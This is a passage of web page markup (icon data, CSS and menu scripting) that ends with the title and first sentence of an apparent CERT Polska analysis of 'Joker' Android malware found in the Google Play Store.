k2NiA0MS4zMDk5IDMyLjUyMzIgNDEuNTI4NSAzMi41MjMySDUyLjQyMDJDNTIuNjM4OCAzMi41MjMyIDUyLjgxODggMzIuMzQ1OSA1Mi44MTg4IDMyLjEzMDZWMzAuMjg3OUM1Mi44MTg4IDMwLjA3MjUgNTIuNjM4OCAyOS44OTUyIDUyLjQyMDIgMjkuODk1Mkg0Mi44NTk1QzQyLjY0MDkgMjkuODk1MiA0Mi40NjA4IDI5LjcxNzkgNDIuNDYwOCAyOS41MDI2VjI0LjgyOTNDNDIuNDYwOCAyNC42MTQgNDIuNjQwOSAyNC40MzY3IDQyLjg1OTUgMjQuNDM2N0g0OS45MTkxQzUwLjEzNzcgMjQuNDM2NyA1MC4zMTc3IDI0LjI1OTQgNTAuMzE3NyAyNC4wNDQxVjIyLjIwNzZDNTAuMzE3NyAyMS45OTIzIDUwLjEzNzcgMjEuODE1IDQ5LjkxOTEgMjEuODE1SDQyLjg1OTVDNDIuNjQwOSAyMS44MTUgNDIuNDYwOCAyMS42Mzc3IDQyLjQ2MDggMjEuNDIyNFYxNi43NDkxQzQyLjQ2MDggMTYuNTMzOCA0Mi42NDA5IDE2LjM1NjUgNDIuODU5NSAxNi4zNTY1SDUyLjQyMDJDNTIuNjM4OCAxNi4zNTY1IDUyLjgxODggMTYuMTc5MSA1Mi44MTg4IDE1Ljk2MzhWMTQuMTIxMUM1Mi44MTg4IDEzLjkwNTggNTIuNjM4OCAxMy43Mjg1IDUyLjQyMDIgMTMuNzI4NSIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTg1LjcwNTkgMTUuOTUxMlYxNC4xMDg0Qzg1LjcwNTkgMTMuODkzMSA4NS41MjU5IDEzLjcxNTggODUuMzA3MyAxMy43MTU4SDcyLjMzMjVDNzIuMTEzOSAxMy43MTU4IDcxLjkzMzggMTMuODkzMSA3MS45MzM4IDE0LjEwODRWMTUuOTUxMkM3MS45MzM4IDE2LjE2NjUgNzIuMTEzOSAxNi4zNDM4IDcyLjMzMjUgMTYuMzQzOEg3Ny4wOTAzQzc3LjMwODkgMTYuMzQzOCA3Ny40ODkgMTYuNTIxMSA3Ny40ODkgMTYuNzM2NFYzMi4xMTc5Qzc3LjQ4OSAzMi4zMzMyIDc3LjY2OSAzMi41MTA1IDc3Ljg4NzYgMzIuNTEwNUg3OS43NTg2Qzc5Ljk3NzIgMzIuNTEwNSA4MC4xNTcyIDMyLjMzMzIgODAuMTU3MiAzMi4xMTc5VjE2LjczNjRDODAuMTU3MiAxNi41MjExIDgwLjMzNzMgMTYuMzQzOCA4MC41NTU5IDE2LjM0MzhIODUuMzEzN0M4NS41MzIzIDE2LjM0MzggODUuNzEyNCAxNi4xNjY1IDg1LjcxMjQgMTUuOTUxMiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTY0LjIzNzggMjQuNzIxNkM2NC4wOTY0IDI0LjU1NyA2NC4xNTQyIDI0LjQyNCA2NC4zNzkzIDI0LjQyNEg2Ny42NTE5QzY3Ljg3MDUgMjQuNDI0IDY4LjE3OTEgMjQuMjk3NCA2OC4zMjcgMjQuMTQ1NEw2OS4wOTg2IDIzLjM3MjhDNjkuMjUyOSAyMy4yMjA4IDY5LjM3NSAyMi45MTY5IDY5LjM2ODYgMjIuNzAxNlYxNS41Mzk2QzY5LjM2ODYgMTUuMzI0MyA2OS4yNCAxNS4wMjY3IDY5LjA4NTcgMTQuODc0N0w2OC4xNzkxIDEzLjk5NDVDNjguMDI0OCAxMy44NDI1IDY3LjcxNjIgMTMuNzIyMiA2Ny40OTc2IDEzLjcyMjJINTcuNTcwNEM1Ny4zNTE4IDEzLjcyMjIgNTcuMDQzMSAxMy44NDg4IDU2Ljg4ODggMTQuMDAwOEw1Ni4xMTczIDE0Ljc2MDdDNTUuOTYzIDE0LjkxMjcgNTUuODQwOCAxNS4yMTY2IDU1Ljg0MDggMTUuNDMxOVYzMi4xMTc5QzU1Ljg0MDggMzIuMzMzMyA1Ni4wMjA4IDMyLjUxMDYgNTYuMjM5NSAzMi41MTA2SDU4LjEwNEM1OC4zMjI2IDMyLjUxMDYgNTguNTAyNyAzMi4zMzMzIDU4LjUwMjcgMzIuMTE3OVYxNi43MzY0QzU4LjUwMjcgMTYuNTIxMSA1OC42ODI3IDE2LjM0MzggNTguOTAxMyAxNi4zNDM4SDY2LjI1NjdDNjYuNDc1MyAxNi4zNDM4IDY2LjY1NTMgMTYuNTIxMSA2Ni42NjE4IDE2LjczNjRMNjYuNjc0NiAyMS40MDk4QzY2LjY3NDYgMjEuNjI1MSA2Ni41MDEgMjEuODAyNCA2Ni4yODI0IDIxLjgwMjRINjEuODEzOUM2MS41OTUzIDIxLjgwMjQgNjEuMzM4MSAyMS45NjA3IDYxLjI0ODEgMjIuMTU3TDYwLjU3MyAyMy42MTM1QzYwLjQ4MyAyMy44MDk4IDYwLjUyMTUgMjQuMTAxMSA2MC42Njk0IDI0LjI2NTdMNjcuMjY2MSAzMi4yMTI5QzY3LjQwNzYgMzIuMzc3NiA2Ny43MDMzIDMyLjUxMDYgNjcuOTIyIDMyLjUxMDZINzAuNjQxN0M3MC44NjAzIDMyLjUxMDYgNzAuOTI0NiAzMi4zNzc2IDcwLjc3NjcgMzIuMjEyOUw2NC4yMTg1IDI0LjcyMTZINjQuMjM3OFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0xMTkuOTI0IDI5Ljg4MjZIMTEyLjM5NUMxMTIuMTc3IDI5Ljg4MjYgMTExLjk5NyAyOS43MDUzIDExMS45OTcgMjkuNDlWMTQuMTE0OEMxMTEuOTk3IDEzLjg5OTUgMTExLjgxNyAxMy43MjIyIDExMS41OTggMTMuNzIyMkgxMDkuNzMzQzEwOS41MTUgMTMuNzIyMiAxMDkuMzM1IDEzLjg5OTUgMTA5LjMzNSAxNC4xMTQ4VjMwLjgwNzFDMTA5LjMzNSAzMS4wMjI0IDEwOS40NjMgMzEuMzI2NCAxMDkuNjE4IDMxLjQ3ODRMMTEwLjM4OSAzMi4yMzgzQzExMC41NDMgMzIuMzkwMiAxMTAuODQ2IDMyLjUxNjkgMTExLjA2NCAzMi41MTY5SDExOS45MjRDMTIwLjE0MyAzMi41MTY5IDEyMC4zMjMgMzIuMzM5NiAxMjAuMzIzIDMyLjEyNDNWMzAuMjgxNUMxMjAuMzIzIDMwLjA2NjIgMTIwLjE0MyAyOS44ODg5IDExOS45MjQgMjkuODg4OSIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEwNS4wNTkgMTMuOTk0NEMxMDQuOTA1IDEzLjg0MjUgMTA0LjU5NiAxMy43MTU4IDEwNC4zNzcgMTMuNzE1OEg5NC42NTU5Qzk0LjQzNzMgMTMuNzE1OCA5NC4xMjg3IDEzLjg0MjUgOTMuOTc0NCAxMy45OTQ0TDkzLjIwMjggMTQuNzU0M0M5My4wNDg1IDE0LjkwNjMgOTIuOTE5OSAxNS4yMTAzIDkyLjkxOTkgMTUuNDI1NlYzMi4xMTE2QzkyLjkxOTkgMzIuMzI2OSA5My4wOTk5IDMyLjUwNDIgOTMuMzE4NiAzMi41MDQySDk1LjE4MzFDOTUuNDAxNyAzMi41MDQyIDk1LjU4MTggMzIuMzI2OSA5NS41ODE4IDMyLjExMTZWMTYuNzQyN0M5NS41ODE4IDE2LjUyNzQgOTUuNzYxOCAxNi4zNTAxIDk1Ljk4MDQgMTYuMzUwMUgxMDMuMTExQzEwMy4zMjkgMTYuMzUwMSAxMDMuNTA5IDE2LjUyNzQgMTAzLjUxNiAxNi43NDI3VjIxLjQwOThDMTAzLjUxNiAyMS42MjUxIDEwMy4zNDIgMjEuODAyNCAxMDMuMTI0IDIxLjgwMjRIOTcuNDA3N0M5Ny4xODkxIDIxLjgwMjQgOTcuMDA5MSAyMS45Nzk3IDk3LjAwOTEgMjIuMTk1VjI0LjAzNzdDOTcuMDA5MSAyNC4yNTMgOTcuMTg5MSAyNC40MzAzIDk3LjQwNzcgMjQuNDMwM0gxMDQuNTEyQzEwNC43MzEgMjQuNDMwMyAxMDUuMDMzIDI0LjMwMzcgMTA1LjE4OCAyNC4xNTE3TDEwNS45NTkgMjMuMzc5MUMxMDYuMTEzIDIzLjIyNzIgMTA2LjIzNiAyMi45MjMyIDEwNi4yMjkgMjIuNzA3OVYxNS40MDY2QzEwNi4yMjkgMTUuMTkxMyAxMDYuMDk0IDE0Ljg5MzcgMTA1Ljk0IDE0Ljc0MTdMMTA1LjA0NiAxNC4wMDA4TDEwNS4wNTkgMTMuOTk0NFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik04Ny40NTQ5IDI5LjUwMjlIODUuMzY1M0M4NS4xMjA5IDI5LjUwMjkgODQuOTIxNiAyOS42OTkyIDg0LjkyMTYgMjkuOTM5OVYzMi4wNjc2Qzg0LjkyMTYgMzIuMzA4MiA4NS4xMjA5IDMyLjUwNDUgODUuMzY1MyAzMi41MDQ1SDg3LjQ1NDlDODcuNjk5MiAzMi41MDQ1IDg3Ljg5ODUgMzIuMzA4MiA4Ny44OTg1IDMyLjA2NzZWMjkuOTM5OUM4Ny44OTg1IDI5LjY5OTIgODcuNjk5MiAyOS41MDI5IDg3LjQ1NDkgMjkuNTAyOVoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=");
        width: 173px;
        height: 60px;
        margin: 10px 10px 10px 10px;
    }
    
    .desktop-header .menu-root a {
        color: #C8CCCE;
    }
    
    .desktop-header .menu-root a:hover {
        color: #FCFDFD;
    }
    
    .desktop-header .menu-root {
        color: #C8CCCE;
    }
    
    .desktop-header .menu-root ul,
    .desktop-header .menu-root li {
        margin: 0;
        padding: 0;
    }
    
    .desktop-header .menu-root ul {
        list-style: none;
        display: flex;
        gap: 15px;
    }
    
    .desktop-header .menu-root li {
        display: flex;
        align-items: center;
    }
    
    .desktop-header .menu-root li.menu-button {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY0MF83OTgyIiBzdHlsZT0ibWFzay10eXBlOmFscGhhIiBtYXNrVW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4PSIwIiB5PSIwIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiPgo8cmVjdCB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIGZpbGw9IiNEOUQ5RDkiLz4KPC9tYXNrPgo8ZyBtYXNrPSJ1cmwoI21hc2swXzY0MF83OTgyKSI+CjxwYXRoIGQ9Ik0xMC4xNjY3IDEzLjI5NjlMNSA4LjI5MTY3TDYuMzMzMzMgN0wxMC4xNjY3IDEwLjcxMzVMMTQgN0wxNS4zMzMzIDguMjkxNjdMMTAuMTY2NyAxMy4yOTY5WiIgZmlsbD0iI0M4Q0NDRSIvPgo8L2c+Cjwvc3ZnPgo=");
        background-repeat: no-repeat;
        background-position: right center;
        padding-right: 25px;
    }
    
    .desktop-header .menu-root li.menu-button.active {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY0MF83OTg4IiBzdHlsZT0ibWFzay10eXBlOmFscGhhIiBtYXNrVW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4PSIwIiB5PSIwIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiPgo8cmVjdCB4PSIyMCIgeT0iMjAiIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdHJhbnNmb3JtPSJyb3RhdGUoLTE4MCAyMCAyMCkiIGZpbGw9IiNEOUQ5RDkiLz4KPC9tYXNrPgo8ZyBtYXNrPSJ1cmwoI21hc2swXzY0MF83OTg4KSI+CjxwYXRoIGQ9Ik05LjgzMzU4IDYuNzAzMTJMMTUuMDAwMiAxMS43MDgzTDEzLjY2NjkgMTNMOS44MzM1OCA5LjI4NjQ2TDYuMDAwMjQgMTNMNC42NjY5MSAxMS43MDgzTDkuODMzNTggNi43MDMxMloiIGZpbGw9IiNGQ0ZERkQiLz4KPC9nPgo8L3N2Zz4K");
        color: #FCFDFD;
    }
    
    .desktop-header .language {
        height: 50px;
        width: 50px;
        background-repeat: no-repeat;
        background-position: center;
        margin-left: auto;
        display: inline-block;
    }
    
    .desktop-header .language.pl {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyMiAyMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzcyNF8xMDM2MCkiPgo8cGF0aCBkPSJNMTkuNTU1NiAzLjA1NTY2SDIuNDQ0NDRDMS43OTYxNCAzLjA1NTY2IDEuMTc0MzggMy4zMTMyIDAuNzE1OTYxIDMuNzcxNjNDMC4yNTc1MzkgNC4yMzAwNSAwIDQuODUxOCAwIDUuNTAwMTFMMCAxMS4wMDAxSDIyVjUuNTAwMTFDMjIgNC44NTE4IDIxLjc0MjUgNC4yMzAwNSAyMS4yODQgMy43NzE2M0MyMC44MjU2IDMuMzEzMiAyMC4yMDM5IDMuMDU1NjYgMTkuNTU1NiAzLjA1NTY2WiIgZmlsbD0iI0VFRUVFRSIvPgo8cGF0aCBkPSJNMCAxNi41QzAgMTcuMTQ4MyAwLjI1NzUzOSAxNy43NzAxIDAuNzE1OTYxIDE4LjIyODVDMS4xNzQzOCAxOC42ODY5IDEuNzk2MTQgMTguOTQ0NCAyLjQ0NDQ0IDE4Ljk0NDRIMTkuNTU1NkMyMC4yMDM5IDE4Ljk0NDQgMjAuODI1NiAxOC42ODY5IDIxLjI4NCAxOC4yMjg1QzIxLjc0MjUgMTcuNzcwMSAyMiAxNy4xNDgzIDIyIDE2LjVWMTFIMFYxNi41WiIgZmlsbD0iI0RDMTQzQyIvPgo8L2c+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzcyNF8xMDM2MCI+CjxyZWN0IHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K");
    }
    
    .desktop-header .language.en {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyMiAyMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzc4MV8xMDkzNSkiPgo8cGF0aCBkPSJNMTMuMDYyNSAxOC41NjI1SDE4LjU2MjVDMTkuMjQyMSAxOC41NjI1IDE5LjgxOTYgMTguNDA5MiAyMC4yOTkyIDE4LjE0MjFMMTMuMDYyNSAxMy44MjUzVjE4LjU2MjVaTTIxLjg4MzIgMTUuODg0N0MyMS45NjE1IDE1LjUzNTEgMjIuMDAxNCAxNS4xNjQ5IDIyLjAwMTQgMTQuNzgwOVYxMy4wNjIySDE3LjE1MTFMMjEuODgxOCAxNS44ODQ3TTAuMTIwMzUzIDYuMTA0NjZDMC4wMzg4ODU4IDYuNDcwMzggLTAuMDAxNDY4NjMgNi44NDQwNiA0LjA4MjMyZS0wNSA3LjIxODc1VjguOTM3NUg0Ljg2ODkyTDAuMTIwMzUzIDYuMTA0NjZaTTguOTM3NTQgMy40Mzc1SDMuNDM3NTRDMi43NjI3NiAzLjQzNzUgMi4xODkwNCAzLjU4ODc1IDEuNzExNTcgMy44NTIwNkw4LjkzNzU0IDguMTYyNjlWMy40Mzc1Wk0xLjczMzU3IDE4LjE1ODlDMi4yMDY1NyAxOC40MTQ3IDIuNzcyNzMgMTguNTYyNSAzLjQzNzU0IDE4LjU2MjVIOC45Mzc1NFYxMy44NjE0TDEuNzMzNTcgMTguMTU4OVpNNC4wODIzMmUtMDUgMTMuMDYyNVYxNC43ODEyQzQuMDgyMzJlLTA1IDE1LjE3NjkgMC4wNDE5NzgzIDE1LjU1ODEgMC4xMjQ4MjIgMTUuOTE2N0w0LjkwOTQ4IDEzLjA2MjVINC4wODIzMmUtMDVaTTIwLjMyMDggMy44Njg5MUMxOS44Mzc1IDMuNTk0NTkgMTkuMjUyMSAzLjQzNzUgMTguNTYyNSAzLjQzNzVIMTMuMDYyNVY4LjE5ODc4TDIwLjMyMDggMy44Njg5MVpNMjIgOC45Mzc1VjcuMjE4NzVDMjIgNi44NDI2OSAyMS45NjEyIDYuNDgwMDMgMjEuODg1OSA2LjEzNjk3TDE3LjE5MTcgOC45Mzc1SDIyWiIgZmlsbD0iIzJFMzE5MiIvPgo8cGF0aCBkPSJNMTcuMTkxNiA4LjkzNzVMMjEuODg1OSA2LjEzNjk3QzIxLjY3MDcgNS4xNTI0NyAyMS4xNDY4IDQuMzM3NDQgMjAuMzIwOCAzLjg2ODkxTDEzLjA2MjUgOC4xOTg3OFYzLjQzNzVIMTIuMzc1VjkuNjI1SDIyVjguOTM3NUgxNy4xOTE2Wk0wIDEyLjM3NVYxMy4wNjI1SDQuOTA5NDRMMC4xMjQ3ODEgMTUuOTE2N0MwLjM1MiAxNi44OTgxIDAuODkxNjg4IDE3LjcwMzggMS43MzM1MyAxOC4xNTg5TDguOTM3NSAxMy44NjE0VjE4LjU2MjVIOS42MjVWMTIuMzc1SDBaTTIyIDEyLjM3NUgxMi4zNzVWMTguNTYyNUgxMy4wNjI1VjEzLjgyNTNMMjAuMjk5MSAxOC4xNDI0QzIxLjEzMTMgMTcuNjc5MSAyMS42NjE3IDE2Ljg2ODUgMjEuODgxOCAxNS44ODU0TDE3LjE1MTEgMTMuMDYyNUgyMlYxMi4zNzVaTTguOTM3NSAzLjQzNzVWOC4xNjI2OUwxLjcxMTUzIDMuODUyMDZDMC44NzYyMTkgNC4zMTI2OSAwLjM0MjM3NSA1LjEyMTg4IDAuMTE5OTY5IDYuMTA0NjZMNC44Njg4OCA4LjkzNzVIMFY5LjYyNUg5LjYyNVYzLjQzNzVIOC45Mzc1WiIgZmlsbD0iI0U2RTdFOCIvPgo8cGF0aCBkPSJNMTIuMzc1IDkuNjI1VjMuNDM3NUg5LjYyNVY5LjYyNUgwVjEyLjM3NUg5LjYyNVYxOC41NjI1SDEyLjM3NVYxMi4zNzVIMjJWOS42MjVIMTIuMzc1WiIgZmlsbD0iI0JFMUUyRCIvPgo8cGF0aCBkPSJNNy41NDA4IDguOTM3ODZMMC42NDg2MDkgNC44MjM1MkMwLjUwMDQ1MyA1LjA0MzUyIDAuMzgxNTE2IDUuMjg1NTIgMC4yODMyMDMgNS41NDMzM0w1Ljk3MTIzIDguOTM3ODZINy41Mzk3N00yMS42ODY4IDE2LjUzMTNMMTUuOTA3MyAxMy4wNjI5SDE0LjMwNjhMMjEuMjg5NCAxNy4yNjMxQzIxLjQ1MTMgMTcuMDM2OSAyMS41ODQ4IDE2Ljc5MTUgMjEuNjg2OCAxNi41MzI3TTIwLjg3MTggNC4yNTk3N0wxMy4wNTE1IDguOTM3ODZMMTQuNjM5MiA4LjkzODg5TDIxLjM4NzQgNC44OTg4QzIxLjIzNjggNC42MjQ4MyAyMS4wNzggNC40NDgxNCAyMC44NzE4IDQuMjU5NzdaTTAuNjIyODI4IDE3LjE0NDlDMC43Nzc0NTggMTcuMzgwNCAwLjk2MzU0NCAxNy41OTM3IDEuMTc1OTIgMTcuNzc4OEw4Ljk1ODc3IDEzLjA2MjlINy4zOTAyM0wwLjYyMjgyOCAxNy4xNDQ5WiIgZmlsbD0iI0JFMUUyRCIvPgo8L2c+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzc4MV8xMDkzNSI+CjxyZWN0IHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K");
    }
    
    .desktop-header .search {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY1NF8xMjM0NyIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjRDlEOUQ5Ii8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF82NTRfMTIzNDcpIj4KPHBhdGggZD0iTTIzLjczMTUgMjUuMzMzN0wxNy4yNzE5IDE4Ljg4MjlDMTYuNzYzMyAxOS4yNzIzIDE2LjE3ODMgMTkuNTg1NSAxNS41MTcxIDE5LjgyMjVDMTQuODU1OSAyMC4wNTk2IDE0LjE1MjMgMjAuMTc4MSAxMy40MDYzIDIwLjE3ODFDMTEuNTI0NCAyMC4xNzgxIDkuOTMwNjkgMTkuNTIxOCA4LjYyNTIxIDE4LjIwOTNDNy4zMTk3MyAxNi44OTc1IDYuNjY2OTkgMTUuMzAxOSA2LjY2Njk5IDEzLjQyMjVDNi42NjY5OSAxMS41NDMyIDcuMzE5NzMgOS45NDcyNSA4LjYyNTIxIDguNjM0NzRDOS45MzA2OSA3LjMyMjkxIDExLjUyNDQgNi42NjY5OSAxMy40MDYzIDYuNjY2OTlDMTUuMjg4MiA2LjY2Njk5IDE2Ljg4NjQgNy4zMjI5MSAxOC4yMDA3IDguNjM0NzRDMTkuNTE0MyA5Ljk0NzI1IDIwLjE3MTEgMTEuNTQzMiAyMC4xNzExIDEzLjQyMjVDMjAuMTcxMSAxNC4xNjc1IDIwLjA1NjggMTQuODcwMiAxOS44MjgzIDE1LjUzMDVDMTkuNTk5IDE2LjE5MDggMTkuMjg5NSAxNi43NjY1IDE4Ljg5OTUgMTcuMjU3NUwyNS4zMzM3IDIzLjcwODNMMjMuNzMxNSAyNS4zMzM3Wk0xMy40MDYzIDE3Ljg0MTZDMTQuNjQ0IDE3Ljg0MTYgMTUuNjk1MSAxNy40MTM5IDE2LjU1OTggMTYuNTU4NUMxNy40MjQ1IDE1LjcwMzkgMTcuODU2OCAxNC42NTg1IDE3Ljg1NjggMTMuNDIyNUMxNy44NTY4IDEyLjE4NjYgMTcuNDI0NSAxMS4xNDA5IDE2LjU1OTggMTAuMjg1NUMxNS42OTUxIDkuNDMwODQgMTQuNjQ0IDkuMDAzNSAxMy40MDYzIDkuMDAzNUMxMi4xNjg3IDkuMDAzNSAxMS4xMjE5IDkuNDMwODQgMTAuMjY2IDEwLjI4NTVDOS40MDk1MiAxMS4xNDA5IDguOTgxMjUgMTIuMTg2NiA4Ljk4MTI1IDEzLjQyMjVDOC45ODEyNSAxNC42NTg1IDkuNDA5NTIgMTUuNzAzOSAxMC4yNjYgMTYuNTU4NUMxMS4xMjE5IDE3LjQxMzkgMTIuMTY4NyAxNy44NDE2IDEzLjQwNjMgMTcuODQxNloiIGZpbGw9IiNGQ0ZERkQiLz4KPC9nPgo8L3N2Zz4K");
        height: 50px;
        width: 50px;
        background-repeat: no-repeat;
        background-position: center;
        display: inline-block;
    }
    
    .desktop-header .report-incident {
        margin: 0 0 0 10px;
    }
    
    .desktop-header .slide-menu-overlay {
        width: 100%;
        position: absolute;
        background-color: #212E3B;
        display: none;
        transition: height 0.2s ease-out, background-color 0.2s ease-out;
        overflow: hidden;
        z-index: 99999999;
    }
    
    .desktop-header.active .slide-menu-overlay {
        background-color: #121F29;
    }
    
    @media (max-width: 1160px) {
        .desktop-header .slide-menu-overlay {
            padding: 0 15px;
        }
    }
    
    .desktop-header .slide-menu-container {
        position: relative;
        max-width: 1110px;
        margin: 0 auto;
    }
    
    .desktop-header .slide-menu {
        display: none;
        padding-bottom: 2rem;
    }
    
    .desktop-header .slide-menu .menu-header {
        color: #858889;
        font-size: 1.2rem;
        padding-top: 1rem;
        padding-bottom: 1.3rem;
    }
    
    .desktop-header .slide-menu .links {
        display: flex;
        flex-wrap: wrap;
        font-size: 1.4rem;
    }
    
    .desktop-header .slide-menu-about .links,
    .desktop-header .slide-menu-expert .links
    {
        flex-direction: column;
    }
    
    .desktop-header .slide-menu-expert-container {
        display: flex;
        flex-wrap: wrap;
    }
    
    .desktop-header .slide-menu-expert-container > div {
        width: 50%;
    }
    
    .desktop-header .slide-menu .links a {
        color: #C8CCCE;
        width: 50%;
        padding-bottom: 15px;
    }
    
    .desktop-header .slide-menu .links a:hover {
        color: #FCFDFD;
    }
</style>

<script>
    $(function() {
        let open = false;
        let active = null;
        let closeTimer = null;
        
        $('.desktop-header .menu-root .menu-button').on('mouseover', function() {
            let new_active = $(this).data('menu');
            
            if (active && active !== new_active) {
                $('.desktop-header .slide-menu-' + active).css({'display': 'none'});
                $('.desktop-header .menu-button').removeClass('active');
            }
            
            $('.desktop-header .slide-menu-' + new_active).css({'display': 'inherit'});
            $(this).addClass('active');
            active = new_active;
            
            let height = $('.desktop-header .slide-menu-' + active)[0].scrollHeight + 'px';
            $('.desktop-header .slide-menu-overlay').css({'height': height});
            
            if (!open) {
                open = true;
                $('.desktop-header').addClass('active');
                $('.desktop-header .slide-menu-overlay').css({'display': 'inherit'});
                
                if (height === '0px') {
                    height = $('.desktop-header .slide-menu-' + active)[0].scrollHeight + 'px';
                    $('.desktop-header .slide-menu-overlay').css({'height': height});
                }
            }
        });
        
        $('.desktop-header').on('mouseover', function() {
           clearTimeout(closeTimer);
        });
        
        $('.desktop-header').on('mouseout', function() {
            if (open) {
                closeTimer = setTimeout(function() {
                    $('.desktop-header').removeClass('active');
                    $('.desktop-header .menu-button').removeClass('active');
                    
                    $('.desktop-header .slide-menu-overlay').css({'height': '0'});

                    let _active = active;
                    setTimeout(function() {
                        $('.desktop-header .slide-menu-' + _active).css({'display': 'none'});
                    }, 250);
                    
                    active = null;
                    open = false;
                }, 400);
            }
        });
    });
</script>

<header class="desktop-header">
    <div class="top">
        <a href="/en/" class="logo"></a>

        <div class="menu-root">
            <ul>
                <li class="menu-button" data-menu="about">About us</li>
                <li><a href="../../../../news/">News</a></li>
                <li class="menu-button" data-menu="expert">For experts</li>
            </ul>
        </div>
    
        
        <a href="../../../../../posts/2024/10/analiza-joker/" class="language pl" alt="switch language"></a>
        <a href="/en/search" class="search" alt="search"></a>
        
            <a href="https://incydent.cert.pl/#!/lang=en" class="cta primary report-incident"><span>Report an incident</span></a>
    </div>
    <div class="slide-menu-overlay">
        <div class="slide-menu-container">
            <div class="slide-menu slide-menu-about">
                <div class="menu-header">About us</div>
                <div class="links">
                    <a href="../../../../about-us/">About our team</a>
                    <a href="../../../../contact/">Contact</a>
                </div>
            </div>
            <div class="slide-menu slide-menu-kb">
                <div class="menu-header">Baza wiedzy</div>
                <div class="links">
                    <a href="/falszywe-inwestycje">FaÅszywe inwestycje</a>
                    <a href="/falszywe-sklepy">UwaÅ¼aj na faÅszywe sklepy online</a>
                    <a href="/baza-wiedzy/niebezpieczne-platnosci">(Nie)bezpieczne pÅatnoÅci</a>
                    <a href="/baza-wiedzy/falszywi-konsultanci">FaÅszywi konsultanci</a>
                    <a href="/bezpieczne-hasla">Zadbaj o bezpieczne hasÅa i logowanie</a>
                    <a href="/falszywe-zalaczniki">FaÅszywe zaÅÄczniki w mailach</a>
                    <a href="/szybkie-przelewy">FaÅszywe proÅby o szybki przelew</a>
                    <a href="/baza-wiedzy/falszywe-smsy">FaÅszywe SMSy - plaga ostatnich miesiÄcy</a>
                </div>
                
                <div class="menu-header">Biuletyn OUCH!</div>
                <div class="links">
                    <a href="/ouch">Porady bezpieczeÅstwa OUCH!</a>
                </div>
            </div>
            <div class="slide-menu slide-menu-expert">
                <div class="slide-menu-expert-container">
                    <div>
                        <div class="menu-header">For experts</div>
                        <div class="links">
                            <a href="../../../../publications/">Publications</a>
                            <a href="../../../../warning-list/">The Warning List</a>
                        </div>
                    </div>
                    <div>
                        <div class="menu-header">Projects</div>
                        <div class="links">
                            <a href="../../../../n6/">n6</a>
                            <a href="/en/posts/2024/01/artemis-security-scanner/">Artemis</a>
                            <a href="https://mwdb.cert.pl/">MWDB</a>
                        </div>
                    </div>
                    <div>
                        <div class="menu-header">CVD program</div>
                        <div class="links">
                            <a href="../../../../cvd">CVD policy</a>
                            <a href="../../../../cve">Advisories</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <br />
    </div>
</header>
        <div class="current-page">
            <div class="grid-container content">
                <div class="cert-title">
    The Dark Knight Returns: Joker malware analysis
                </div>
                <div class="cert-subtitle">
    01 October 2024
 |         <a href="../../../../author/kacper-ratajczak/">Kacper Ratajczak</a> |         <a href="../../../../tag/joker/">#joker</a>,         <a href="../../../../tag/analysis/">#analysis</a>,         <a href="../../../../tag/android/">#android</a>                </div>
            </div>
        </div>

    <div class="content grid-container">
        <div class="grid-x grid-padding-x">
            <div class="main cell entry">
                <div class="article">
                    <p>CERT Polska has recently observed new samples of the âJokerâ mobile malware. The applications are present in the Google Play Store and target Polish users, among others.</p>
